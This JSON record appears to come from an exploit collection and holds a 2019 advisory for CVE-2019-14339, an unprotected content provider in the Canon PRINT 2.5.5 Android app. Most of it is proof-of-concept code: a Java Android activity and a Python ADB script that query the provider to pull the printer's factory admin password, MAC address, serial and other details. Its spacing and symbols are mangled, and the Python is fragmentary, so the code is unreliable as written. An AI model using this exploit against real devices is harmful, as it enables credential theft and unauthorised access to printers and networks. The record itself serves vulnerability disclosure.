{
    "text": "vul_name : Canon PRINT 2.5.5 URI Injection ， vul_cve : CVE-2019-14339 ， vul_poc :  # Exploit Title : Content Provider URI Injection on Canon PRINT 2.5.5 ，  ( CVE-2019-14339 )  ，  # Date : 24th July , 2019 ，  # Exploit Author : 0x48piraj ，  # Vendor Homepage :  ，  # Software Link :  ， < ， Exploit :  ，  # Version : Canon PRINT 2.5.5 ，  # Tested on : Android 8.0.0 ，  # CVE : CVE-2019-14339 ， The ContentProvider in the Canon PRINT 2.5.5 application for Android ， does not properly restrict data access. This allows an attacker's ， malicious application to obtain sensitive information including ， factory passwords for administrator web-interface and WPA2-PSK key. ， The mobile application contains unprotected exported content providers ，  ( 'IJPrinterCapabilityProvider' in android/AndroidManifest.xml ) that ， discloses sensitive applications data under certain conditions. To ， securely export the content provider , one should restrict access to it ， by setting up android : protectionLevel or android : grantUriPermissions ， attributes in Android Manifest file. ， - Proof-of-concept code ( Java )  ， package cannon.print.pwn ;  ， public class MainActivity extends AppCompatActivity { ， Button PwnBtn ;  ，  @ Override ， protected void onCreate ( Bundle savedInstanceState ) { ， super.onCreate ( savedInstanceState )  ;  ， setContentView ( R.layout.activity_main )  ;  ， PwnBtn = ( Button ) findViewById ( R.id.button )  ;  ， PwnBtn.setOnClickListener ( new View.OnClickListener (  ) { ，  @ Override ， public void onClick ( View view ) { ， Toast.makeText ( getApplicationContext (  )  , \"Payload ， triggered .\" , Toast.LENGTH_SHORT ) .show (  )  ;  ， Uri cannonURI = ， Uri.parse ( \"content : /canon.ij.printer.capability.data/\" )  ;  ， Cursor cursor = getContentResolver (  ) .query ( cannonURI ,  ， null , null , null , null )  ;  ， int count = cursor.getCount (  )  ;  ， TextView data= ( TextView ) findViewById ( R.id.data )  ;  ， data.setText ( String.valueOf ( count )  ;  ， cursor.moveToFirst (  )  ;  ， String tempstr = \" \" ;  ， tempstr =\" \"+tempstr +\"\\t\"+ cursor.getString ( 0 ) + \"\\t\\t\\t\" ， + cursor.getString ( 1 ) + \"\\t\\t\\t\" + cursor.getString ( 2 )  ;  ， String dpw = StringUtils.substringBetween ( tempstr ,  ， \"<ivec : product_serialnumber>\" , \"</ivec : product_serialnumber>\" )  ;  ， String dmac = cursor.getString ( 4 )  ;  ， String mdeviceid = cursor.getString ( 13 )  ; / raw ， String dtype = StringUtils.substringBetween ( mdeviceid ,  ， \" ; CLS : \" , \" ; DES\" )  ;  ， String timestamp = cursor.getString ( 15 )  ; / ticks ,  ， device last used ， String dclass = StringUtils.substringBetween ( tempstr ,  ， \"<ivec : manufacturer>\" , \"</ivec : manufacturer>\" )  ;  ， String dmodel = StringUtils.substringBetween ( tempstr ,  ， \"<ivec : model>\" , \"</ivec : model>\" )  ;  ， String dserial = StringUtils.substringBetween ( tempstr ,  ， \"<ivec : serialnumber>\" , \"</ivec : serialnumber>\" )  ;  ， String dfmver = StringUtils.substringBetween ( tempstr ,  ， \"<ivec : firmver>\" , \"</ivec : firmver>\" )  ;  ， String dservice = ， StringUtils.substringBetween ( tempstr , \"<ivec : service>\" ,  ， \"</ivec : service>\" )  ;  ， / * More juicy data ， String denv = StringUtils.substringBetween ( tempstr ,  ， \"<vcn : host_environment>\" , \"</vcn : host_environment>\" )  ;  ， String dpapertype = ， StringUtils.substringBetween ( tempstr , \"<ivec : papertype>\" ,  ， \"</ivec : papertype>\" )  ;  ， String dformats = ， StringUtils.substringBetween ( tempstr , \"<ivec : support_data_format>\" ,  ， \"</ivec : support_data_format>\" )  ;  ， String fout = String.format ( \"Device Type : %s\\nDevice ， Class : %s\\nDevice Model : %s\\nDevice Serial : %s\\nDevice MAC Address ，  : %s\\nDevice Factory Password : %s\\nDevice Firmware Version :  ， %s\\nDevice Services : %s\\nDevice Last Used : %s\\n\" , dtype , dclass ,  ， dmodel , dserial , dmac , dpw , dfmver , dservice , timestamp )  ;  ， data.setText ( fout )  ;  ， } ， } )  ;  ， } ， } ， - Proof-of-concept python script over ADB - ， print ( \" [  #  ] Make sure you've connected the target device w/ adb .\" )  ， print ( \" [  *  ] Running the exploit using adb .\\n\\n\" )  ， out = subprocess.getoutput ( \"adb shell content query -uri content : /canon.ij.printer.capability.data/\" )  ， print ( \" [  !  ] Error : Couldn't fetch data from adb .\" )  ， sys.exit ( 1 )  ， varz = [ \" ; CLS : \" , \" ; MDL : \" , \" ; DES : \" , \" ; VER : \" , \" ; PSE : \" ]  #  ， factory_pw_check = ， out.split ( \"<ivec : product_serialnumber>\" )  [ 1 ] .split ( '</ivec : product_serialnumber>' )  [ 0 ]  ， prmz = [ \"Class\" , \"Model\" , \"Description\" , \"Firmware Version\" , \"Factory Password\" ]  ， print ( \" - Device %s : %s\" % ( prm , ext ( out , var )  ， print ( \" - Device MAC Address : {}\".format ( ext ( out , 'mmacaddress=' , ' , ' )  ， print ( \" - Device Last Used : %s\" % ( datetime.timedelta ( microseconds = ， int ( ext ( out , ' , timestamp=' , ' , ' ) /10 ) ",
    "time": "2019.09.01"
}